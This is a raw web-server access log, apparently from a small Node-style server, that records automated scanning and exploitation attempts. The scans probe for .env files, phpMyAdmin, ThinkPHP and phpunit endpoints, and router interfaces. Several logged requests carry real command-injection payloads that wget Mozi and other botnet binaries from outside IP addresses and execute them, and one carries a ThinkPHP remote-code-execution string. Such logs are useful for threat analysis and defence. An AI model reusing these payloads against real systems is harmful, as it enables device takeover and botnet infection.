[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.803 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.984 ms - 1418[0m
[0mGET / [32m200 [0m0.953 ms - 1934[0m
[0mGET / [32m200 [0m0.925 ms - 1934[0m
[0mGET / [32m200 [0m0.846 ms - 1934[0m
[0mGET / [32m200 [0m1.664 ms - 1934[0m
[0mGET / [32m200 [0m0.852 ms - 1934[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.958 ms - 1418[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.926 ms - 1418[0m
[0mGET /mysqladmin/scripts/setup.php [33m404 [0m0.769 ms - 1418[0m
[0mGET /db/scripts/setup.php [33m404 [0m0.907 ms - 1418[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.947 ms - 1413[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m0.942 ms - 1418[0m
[0mGET / [32m200 [0m0.857 ms - 1934[0m
[0mGET /.env [33m404 [0m1.766 ms - 1418[0m
[0mPOST / [33m404 [0m0.954 ms - 1413[0m
[0mGET / [32m200 [0m0.825 ms - 1934[0m
[0mGET / [32m200 [0m0.819 ms - 1934[0m
[0mGET / [32m200 [0m0.871 ms - 1934[0m
[0mGET / [32m200 [0m0.845 ms - 1934[0m
[0mGET / [32m200 [0m0.624 ms - 1934[0m
[0mGET / [32m200 [0m0.836 ms - 1934[0m
[0mPOST /HNAP1/ [33m404 [0m0.924 ms - 1413[0m
[0mGET /TP/public/index.php [33m404 [0m0.938 ms - 1418[0m
[0mGET /TP/index.php [33m404 [0m1.132 ms - 1418[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m1.000 ms - 1418[0m
[0mGET / [32m200 [0m0.843 ms - 1934[0m
[0mGET / [32m200 [0m0.828 ms - 1934[0m
[0mGET / [32m200 [0m0.837 ms - 1934[0m
[0mGET / [32m200 [0m0.913 ms - 1934[0m
[0mGET / [32m200 [0m0.713 ms - 1934[0m
[0mGET / [32m200 [0m0.794 ms - 1934[0m
[0mGET /.env [33m404 [0m1.785 ms - 1418[0m
[0mPOST / [33m404 [0m1.076 ms - 1413[0m
[0mGET / [32m200 [0m0.831 ms - 1934[0m
[0mGET / [32m200 [0m0.827 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.937 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.819 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.825 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.947 ms - 1418[0m
[0mGET /.env [33m404 [0m0.853 ms - 1418[0m
[0mPOST / [33m404 [0m1.796 ms - 1413[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.921 ms - 1413[0m
[0mGET / [32m200 [0m0.850 ms - 1934[0m
[0mPOST /cgi-bin/mainfunction.cgi [33m404 [0m0.834 ms - 1413[0m
[0mGET / [32m200 [0m0.861 ms - 1934[0m
[0mGET / [32m200 [0m0.738 ms - 1934[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.230.194.179:51863/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.927 ms - 1418[0m
[0mGET / [32m200 [0m0.887 ms - 1934[0m
[0mGET / [32m200 [0m0.848 ms - 1934[0m
[0mGET / [32m200 [0m0.655 ms - 1934[0m
[0mGET / [32m200 [0m0.886 ms - 1934[0m
[0mGET / [32m200 [0m0.667 ms - 1934[0m
[0mPOST /HNAP1/ [33m404 [0m0.882 ms - 1413[0m
[0mGET / [32m200 [0m0.797 ms - 1934[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+185.172.111.214/bins/UnHAnaAW.x86;chmod+777+/tmp/UnHAnaAW.x86;sh+/tmp/UnHAnaAW.x86+w00dy.jaws [0m- [0m- ms - -[0m
[0mGET / [32m200 [0m0.904 ms - 1934[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.027 ms - 1418[0m
[0mPOST /HNAP1/ [33m404 [0m0.833 ms - 1413[0m
[0mGET /favicon.ico [33m404 [0m13.921 ms - 1418[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.066 ms - 1413[0m
[0mGET /.env [33m404 [0m0.902 ms - 1418[0m
[0mGET /vendor/.env [33m404 [0m0.875 ms - 1418[0m
[0mGET /storage/.env [33m404 [0m2.435 ms - 1418[0m
[0mGET /public/.env [33m404 [0m0.914 ms - 1418[0m
[0mPOST / [33m404 [0m1.000 ms - 1413[0m
[0mGET / [32m200 [0m1.004 ms - 1934[0m
[0mGET / [32m200 [0m0.798 ms - 1934[0m
[0mGET / [32m200 [0m1.638 ms - 1934[0m
[0mPOST /cgi-bin/web_json.cgi [33m404 [0m19.102 ms - 1413[0m
[0mPOST /cgi-bin/web_json.cgi [33m404 [0m0.957 ms - 1413[0m
[0mGET / [32m200 [0m0.829 ms - 1934[0m
[0mGET / [32m200 [0m0.892 ms - 1934[0m
[0mPOST /cgi-bin/web_json.cgi [33m404 [0m0.989 ms - 1413[0m
[0mGET / [32m200 [0m0.878 ms - 1934[0m
[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.007 ms - 1418[0m
[0mGET / [32m200 [0m0.945 ms - 1934[0m
[0mGET / [32m200 [0m0.918 ms - 1934[0m
[0mGET / [32m200 [0m0.919 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.057 ms - 1418[0m
[0mGET / [32m200 [0m0.827 ms - 1934[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.861 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.871 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.976 ms - 1418[0m
[0mGET / [32m200 [0m2.196 ms - 1934[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m1.852 ms - 1418[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.925 ms - 1418[0m
[0mGET /phpMyAdmin/scripts/setup.php [33m404 [0m0.933 ms - 1418[0m
[0mGET /db/scripts/setup.py [33m404 [0m0.869 ms - 1418[0m
[0mGET /mysqladmin/scripts/setup.py [33m404 [0m0.911 ms - 1418[0m
[0mGET /mysql/scripts/setup.py [33m404 [0m0.906 ms - 1418[0m
[0mGET /myadmin/scripts/setup.py [33m404 [0m0.888 ms - 1418[0m
[0mGET /phpMyAdmin-3.1.2.0-english/scripts/setup.php [33m404 [0m0.953 ms - 1418[0m
[0mGET /phpmyadmin1/scripts/setup.php [33m404 [0m0.905 ms - 1418[0m
[0mGET /phpMyAdmin2/scripts/setup.php [33m404 [0m1.767 ms - 1418[0m
[0mGET /phpMyAdmin-2.11.4/scripts/setup.php [33m404 [0m0.931 ms - 1418[0m
[0mGET /phpMyAdmin-2.11.3/scripts/setup.php [33m404 [0m0.872 ms - 1418[0m
[0mGET /admin/pma/scripts/setup.php [33m404 [0m0.889 ms - 1418[0m
[0mGET /database/scripts/setup.php [33m404 [0m0.847 ms - 1418[0m
[0mGET /pma/scripts/setup.php [33m404 [0m0.841 ms - 1418[0m
[0mGET / [32m200 [0m0.952 ms - 1934[0m
[0mGET / [32m200 [0m0.808 ms - 1934[0m
[0mGET / [32m200 [0m0.826 ms - 1934[0m
[0mGET / [32m200 [0m1.666 ms - 1934[0m
[0mGET /.env [33m404 [0m0.846 ms - 1418[0m
[0mPOST / [33m404 [0m0.901 ms - 1413[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.957 ms - 1413[0m
[0mGET / [32m200 [0m0.863 ms - 1934[0m
[0mGET / [32m200 [0m0.881 ms - 1934[0m
[0mGET / [32m200 [0m0.862 ms - 1934[0m
[0mGET /.env [33m404 [0m0.958 ms - 1418[0m
[0mPOST / [33m404 [0m1.065 ms - 1413[0m
[0mGET / [32m200 [0m0.974 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.947 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.809 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.885 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.923 ms - 1418[0m
[0mGET /TP/public/index.php [33m404 [0m0.931 ms - 1418[0m
[0mGET /TP/index.php [33m404 [0m0.938 ms - 1418[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.998 ms - 1418[0m
[0mGET /html/public/index.php [33m404 [0m0.941 ms - 1418[0m
[0mGET /public/index.php [33m404 [0m1.688 ms - 1418[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.987 ms - 1418[0m
[0mGET /elrekt.php [33m404 [0m0.939 ms - 1418[0m
[0mGET /index.php [33m404 [0m0.975 ms - 1418[0m
[0mGET / [32m200 [0m0.874 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.903 ms - 1413[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.980 ms - 1418[0m
[0mPOST /HNAP1/ [33m404 [0m0.809 ms - 1413[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.935 ms - 1413[0m
[0mGET /ReportServer [33m404 [0m0.952 ms - 1418[0m
[0mGET / [32m200 [0m0.854 ms - 1934[0m
[0mGET /.env [33m404 [0m0.809 ms - 1418[0m
[0mPOST / [33m404 [0m0.909 ms - 1413[0m
[0mGET / [32m200 [0m0.901 ms - 1934[0m
[0mGET / [32m200 [0m0.946 ms - 1934[0m
[0mGET / [32m200 [0m0.810 ms - 1934[0m
[0mGET / [32m200 [0m0.907 ms - 1934[0m
[0mHEAD http://112.124.42.80:63435/ [32m200 [0m1.716 ms - 1934[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://112.237.22.191:43760/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.992 ms - 1418[0m
[0mGET /portal/redlion [33m404 [0m0.971 ms - 1418[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.972 ms - 1418[0m
[0mGET / [32m200 [0m2.666 ms - 1934[0m
[0mGET /w00tw00t.at.blackhats.romanian.anti-sec:) [33m404 [0m0.900 ms - 1418[0m
[0mGET /phpmyadmin/scripts/setup.php [33m404 [0m0.800 ms - 1418[0m
[0mGET /mysqladmin/scripts/setup.php [33m404 [0m0.929 ms - 1418[0m
[0mGET /db/scripts/setup.php [33m404 [0m0.930 ms - 1418[0m
[0mGET /.env [33m404 [0m1.667 ms - 1418[0m
[0mPOST / [33m404 [0m0.993 ms - 1413[0m
[0mGET / [32m200 [0m0.846 ms - 1934[0m
[0mGET / [32m200 [0m0.822 ms - 1934[0m
[0mGET / [32m200 [0m0.924 ms - 1934[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.943 ms - 1418[0m
[0mGET /phpmyadmin/ [33m404 [0m0.880 ms - 1418[0m
[0mGET / [32m200 [0m0.916 ms - 1934[0m
[0mGET /.env [33m404 [0m1.806 ms - 1418[0m
[0mPOST / [33m404 [0m0.974 ms - 1413[0m
[0mGET / [32m200 [0m0.865 ms - 1934[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.967 ms - 1418[0m
[0mGET / [32m200 [0m0.842 ms - 1934[0m
[0mGET / [32m200 [0m0.814 ms - 1934[0m
[0mHEAD /robots.txt [33m404 [0m0.934 ms - 1418[0m
[0mGET / [32m200 [0m0.877 ms - 1934[0m
[0mGET / [32m200 [0m0.867 ms - 1934[0m
[0mGET / [32m200 [0m1.635 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.937 ms - 1418[0m
[0mGET / [32m200 [0m0.873 ms - 1934[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.825 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.825 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.897 ms - 1418[0m
[0mGET / [32m200 [0m0.932 ms - 1934[0m
[0mGET / [32m200 [0m0.826 ms - 1934[0m
[0mGET / [32m200 [0m1.722 ms - 1934[0m
[0mGET / [32m200 [0m0.865 ms - 1934[0m
[0mGET / [32m200 [0m0.858 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.911 ms - 1413[0m
[0mGET / [32m200 [0m0.843 ms - 1934[0m
[0mGET /hudson [33m404 [0m0.944 ms - 1418[0m
[0mGET http://5.188.210.227/echo.php [33m404 [0m1.089 ms - 1418[0m
[0mGET / [32m200 [0m0.921 ms - 1934[0m
[0mGET / [32m200 [0m0.699 ms - 1934[0m
[0mOPTIONS / [32m200 [0m0.300 ms - 8[0m
[0mGET /muieblackcat [33m404 [0m0.984 ms - 1418[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.934 ms - 1418[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.908 ms - 1418[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.987 ms - 1418[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m0.920 ms - 1418[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m0.939 ms - 1418[0m
[0mGET / [32m200 [0m0.841 ms - 1934[0m
[0mGET / [32m200 [0m0.971 ms - 1934[0m
[0mGET / [32m200 [0m1.397 ms - 1934[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.790 ms - 1413[0m
[0mGET / [32m200 [0m78.849 ms - 1934[0m
[0mGET / [32m200 [0m2.596 ms - 1934[0m
[0mHEAD / [32m200 [0m0.869 ms - 1934[0m
[0mGET /nmaplowercheck1602090680 [33m404 [0m2.602 ms - 1418[0m
[0mGET /HNAP1 [33m404 [0m1.008 ms - 1418[0m
[0mGET /.env [33m404 [0m0.900 ms - 1418[0m
[0mPOST / [33m404 [0m1.031 ms - 1413[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m5.481 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.812 ms - 1934[0m
[0mGET / [32m200 [0m0.759 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.820 ms - 1934[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m0.985 ms - 1418[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.998 ms - 1418[0m
[0mGET / [32m200 [0m0.848 ms - 1934[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://176.221.206.8:45992/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m0.991 ms - 1418[0m
[0mGET / [32m200 [0m0.902 ms - 1934[0m
[0mGET / [32m200 [0m1.484 ms - 1934[0m
[0mGET / [32m200 [0m0.889 ms - 1934[0m
[0mGET /.env [33m404 [0m0.904 ms - 1418[0m
[0mPOST / [33m404 [0m1.055 ms - 1413[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.970 ms - 1413[0m
[0mGET /.env [33m404 [0m0.862 ms - 1418[0m
[0mPOST / [33m404 [0m1.121 ms - 1413[0m
[0mGET / [32m200 [0m0.865 ms - 1934[0m
[0mGET / [32m200 [0m0.919 ms - 1934[0m
[0mGET /.env [33m404 [0m0.903 ms - 1418[0m
[0mPOST / [33m404 [0m1.073 ms - 1413[0m
[0mGET / [32m200 [0m0.831 ms - 1934[0m
[0mGET / [32m200 [0m0.879 ms - 1934[0m
[0mGET /.env [33m404 [0m0.936 ms - 1418[0m
[0mPOST / [33m404 [0m1.061 ms - 1413[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.982 ms - 1418[0m
[0mGET /.env [33m404 [0m0.946 ms - 1418[0m
[0mPOST / [33m404 [0m1.094 ms - 1413[0m
[0mPOST / [33m404 [0m1.091 ms - 1413[0m
[0mGET /.env [33m404 [0m0.865 ms - 1418[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.000 ms - 1418[0m
[0mGET / [32m200 [0m0.846 ms - 1934[0m
[0mGET / [32m200 [0m0.802 ms - 1934[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.121.128.226:34925/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m1.001 ms - 1418[0m
[0mPOST /cgi-bin/mainfunction.cgi [33m404 [0m0.894 ms - 1413[0m
[0mGET / [32m200 [0m0.904 ms - 1934[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.788 ms - 1413[0m
[0mGET /portal/redlion [33m404 [0m1.812 ms - 1418[0m
[0mGET / [32m200 [0m0.896 ms - 1934[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m0.917 ms - 1418[0m
[0mGET / [32m200 [0m0.874 ms - 1934[0m
[0mGET / [32m200 [0m4.296 ms - 1934[0m
[0mGET / [32m200 [0m0.877 ms - 1934[0m
[0mGET / [32m200 [0m0.895 ms - 1934[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://212.73.150.134//var/www/html/%20-O%20/var/tmp/mips;%20chmod%20777%20/var/tmp/mips;%20/var/tmp/mips;%20rm%20-rf%20/var/tmp/mips&curpath=/&currentsetting.htm=1 [33m404 [0m0.942 ms - 1418[0m
[0mGET / [32m200 [0m0.881 ms - 1934[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://212.73.150.134//var/www/html/%20-O%20/var/tmp/mips;%20chmod%20777%20/var/tmp/mips;%20/var/tmp/mips;%20rm%20-rf%20/var/tmp/mips&curpath=/&currentsetting.htm=1 [33m404 [0m0.933 ms - 1418[0m
[0mGET / [32m200 [0m0.847 ms - 1934[0m
[0mGET /config/getuser?index=0 [33m404 [0m0.957 ms - 1418[0m
[0mGET / [32m200 [0m0.927 ms - 1934[0m
[0mGET / [32m200 [0m0.845 ms - 1934[0m
[0mGET /.env [33m404 [0m0.926 ms - 1418[0m
[0mPOST / [33m404 [0m0.903 ms - 1413[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.979 ms - 1418[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.915 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m1.629 ms - 1934[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m0.997 ms - 1418[0m
[0mGET /.env [33m404 [0m0.922 ms - 1418[0m
[0mPOST / [33m404 [0m1.038 ms - 1413[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.958 ms - 1418[0m
[0mGET /.env [33m404 [0m0.857 ms - 1418[0m
[0mPOST / [33m404 [0m0.976 ms - 1413[0m
[0mGET / [32m200 [0m0.810 ms - 1934[0m
[0mGET / [32m200 [0m0.837 ms - 1934[0m
[0mGET / [32m200 [0m1.608 ms - 1934[0m
[0mGET /.env [33m404 [0m0.908 ms - 1418[0m
[0mPOST / [33m404 [0m1.008 ms - 1413[0m
[0mGET / [32m200 [0m2.162 ms - 1934[0m
[0mGET /webfig/ [33m404 [0m1.014 ms - 1418[0m
[0mGET /admin/.env [33m404 [0m0.897 ms - 1418[0m
[0mPOST /admin [33m404 [0m1.013 ms - 1413[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m1.049 ms - 1418[0m
[0mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://120.59.120.246:35671/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 [33m404 [0m0.967 ms - 1418[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.716 ms - 1413[0m
[0mGET / [32m200 [0m0.867 ms - 1934[0m
[0mGET / [32m200 [0m0.830 ms - 1934[0m
[0mGET /TP/public/index.php [33m404 [0m0.994 ms - 1418[0m
[0mGET /TP/index.php [33m404 [0m0.947 ms - 1418[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.927 ms - 1418[0m
[0mGET /html/public/index.php [33m404 [0m0.991 ms - 1418[0m
[0mGET /public/index.php [33m404 [0m1.007 ms - 1418[0m
[0mGET /TP/html/public/index.php [33m404 [0m0.966 ms - 1418[0m
[0mGET /elrekt.php [33m404 [0m1.790 ms - 1418[0m
[0mGET /index.php [33m404 [0m0.992 ms - 1418[0m
[0mGET / [32m200 [0m0.838 ms - 1934[0m
[0mPOST /HNAP1/ [33m404 [0m0.856 ms - 1413[0m
[0mGET / [32m200 [0m0.856 ms - 1934[0m
[0mGET / [32m200 [0m0.754 ms - 1934[0m
[0mGET / [32m200 [0m0.841 ms - 1934[0m
[0mGET / [32m200 [0m0.904 ms - 1934[0m
[0mGET / [32m200 [0m0.822 ms - 1934[0m
[0mGET / [32m200 [0m1.698 ms - 1934[0m
[0mGET /boaform/admin/formLogin?username=ec8&psd=ec8 [33m404 [0m1.076 ms - 1418[0m
[0mGET / [32m200 [0m0.801 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.001 ms - 1418[0m
[0mGET / [32m200 [0m0.824 ms - 1934[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.803 ms - 1934[0m
[0mGET /.env [33m404 [0m0.968 ms - 1418[0m
[0mPOST / [33m404 [0m0.967 ms - 1413[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.919 ms - 1934[0m
[0mGET / [32m200 [0m1.616 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.939 ms - 1418[0m
[0mGET / [32m200 [0m0.857 ms - 1934[0m
[0mGET / [32m200 [0m0.864 ms - 1934[0m
[0mGET / [32m200 [0m0.880 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.942 ms - 1413[0m
[0mGET / [32m200 [0m0.952 ms - 1934[0m
[0mGET /phpmyadmin/index.php?lang=en [33m404 [0m0.980 ms - 1418[0m
[0mGET / [32m200 [0m0.916 ms - 1934[0m
[0mGET /HNAP1/ [33m404 [0m0.953 ms - 1418[0m
[0mHEAD /robots.txt [33m404 [0m0.952 ms - 1418[0m
[0mGET / [32m200 [0m0.870 ms - 1934[0m
[0mGET /manager/text/list [33m404 [0m0.952 ms - 1418[0m
[0mGET /manager/html [33m404 [0m0.941 ms - 1418[0m
[0mGET /.env [33m404 [0m0.965 ms - 1418[0m
[0mPOST / [33m404 [0m1.074 ms - 1413[0m
[0mGET /.env [33m404 [0m0.909 ms - 1418[0m
[0mPOST / [33m404 [0m0.989 ms - 1413[0m
[0mGET /.env [33m404 [0m1.711 ms - 1418[0m
[0mPOST / [33m404 [0m1.015 ms - 1413[0m
[0mGET / [32m200 [0m0.901 ms - 1934[0m
[0mGET / [32m200 [0m0.785 ms - 1934[0m
[0mGET /boaform/admin/formLogin?username=user&psd=user [33m404 [0m3.265 ms - 1418[0m
[0mGET /.env [33m404 [0m0.913 ms - 1418[0m
[0mPOST / [33m404 [0m1.049 ms - 1413[0m
[0mGET / [32m200 [0m0.861 ms - 1934[0m
[0mGET / [32m200 [0m0.723 ms - 1934[0m
[0mGET /.env [33m404 [0m1.718 ms - 1418[0m
[0mPOST / [33m404 [0m1.074 ms - 1413[0m
[0mGET /.env [33m404 [0m0.889 ms - 1418[0m
[0mPOST / [33m404 [0m0.995 ms - 1413[0m
[0mGET /.env [33m404 [0m0.996 ms - 1418[0m
[0mPOST / [33m404 [0m1.038 ms - 1413[0m
[0mGET /.env [33m404 [0m0.900 ms - 1418[0m
[0mPOST / [33m404 [0m1.011 ms - 1413[0m
[0mGET / [32m200 [0m0.886 ms - 1934[0m
[0mGET / [32m200 [0m1.657 ms - 1934[0m
[0mGET / [32m200 [0m0.842 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.969 ms - 1418[0m
[0mGET /.env [33m404 [0m0.870 ms - 1418[0m
[0mPOST / [33m404 [0m1.165 ms - 1413[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.799 ms - 1934[0m
[0mGET /.env [33m404 [0m0.895 ms - 1418[0m
[0mPOST / [33m404 [0m1.013 ms - 1413[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.819 ms - 1934[0m
[0mGET / [32m200 [0m1.801 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.959 ms - 1418[0m
[0mGET / [32m200 [0m0.846 ms - 1934[0m
[0mGET / [32m200 [0m0.876 ms - 1934[0m
[0mGET / [32m200 [0m0.850 ms - 1934[0m
[0mGET / [32m200 [0m0.825 ms - 1934[0m
[0mGET /TP/public/index.php [33m404 [0m0.969 ms - 1418[0m
[0mGET / [32m200 [0m0.938 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.936 ms - 1413[0m
[0mGET / [32m200 [0m1.742 ms - 1934[0m
[0mGET / [32m200 [0m0.842 ms - 1934[0m
[0mGET / [32m200 [0m0.845 ms - 1934[0m
[0mGET / [32m200 [0m0.811 ms - 1934[0m
[0mGET / [32m200 [0m0.841 ms - 1934[0m
[0mGET / [32m200 [0m0.928 ms - 1934[0m
[0mGET / [32m200 [0m0.926 ms - 1934[0m
[0mGET / [32m200 [0m0.846 ms - 1934[0m
[0mGET / [32m200 [0m0.831 ms - 1934[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+http://222.141.87.239:39837/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws [33m404 [0m8.140 ms - 1418[0m
[0mGET / [32m200 [0m0.794 ms - 1934[0m
[0mPOST /GponForm/diag_Form?images/ [33m404 [0m0.804 ms - 1413[0m
[0mGET / [32m200 [0m0.860 ms - 1934[0m
[0mGET / [32m200 [0m0.840 ms - 1934[0m
[0mGET / [32m200 [0m0.831 ms - 1934[0m
[0mGET /boaform/admin/formLogin?username=adminisp&psd=adminisp [33m404 [0m0.979 ms - 1418[0m
[0mGET / [32m200 [0m0.817 ms - 1934[0m
[0mGET /webtools/control/xmlrpc [33m404 [0m0.987 ms - 1418[0m
[0mGET / [32m200 [0m1.715 ms - 1934[0m
[0mGET http://example.com/ [32m200 [0m0.846 ms - 1934[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.954 ms - 1418[0m
[0mGET / [32m200 [0m0.821 ms - 1934[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.835 ms - 1934[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.843 ms - 1934[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.986 ms - 1418[0m
[0mGET /.env [33m404 [0m0.930 ms - 1418[0m
[0mPOST / [33m404 [0m0.997 ms - 1413[0m
[0mGET / [32m200 [0m1.779 ms - 1934[0m
[0mGET / [32m200 [0m0.845 ms - 1934[0m
[0mGET /.env [33m404 [0m0.902 ms - 1418[0m
[0mPOST / [33m404 [0m0.970 ms - 1413[0m
[0mGET / [32m200 [0m0.889 ms - 1934[0m
[0mGET / [32m200 [0m0.596 ms - 1934[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.930 ms - 1413[0m
[0mGET /.env [33m404 [0m0.908 ms - 1418[0m
[0mPOST / [33m404 [0m1.031 ms - 1413[0m
[0mGET / [32m200 [0m1.768 ms - 1934[0m
[0mGET / [32m200 [0m0.808 ms - 1934[0m
[0mGET /phpmyadmin/ [33m404 [0m1.141 ms - 1418[0m
[0mGET / [32m200 [0m0.888 ms - 1934[0m
[0mGET /.env [33m404 [0m0.860 ms - 1418[0m
[0mPOST / [33m404 [0m1.070 ms - 1413[0m
[0mGET / [32m200 [0m0.860 ms - 1934[0m
[0mGET / [32m200 [0m0.648 ms - 1934[0m
[0mGET / [32m200 [0m0.828 ms - 1934[0m
[0mGET / [32m200 [0m0.840 ms - 1934[0m
[0mGET / [32m200 [0m0.819 ms - 1934[0m
[0mGET / [32m200 [0m0.849 ms - 1934[0m
[0mGET / [32m200 [0m0.828 ms - 1934[0m
[0mGET / [32m200 [0m0.823 ms - 1934[0m
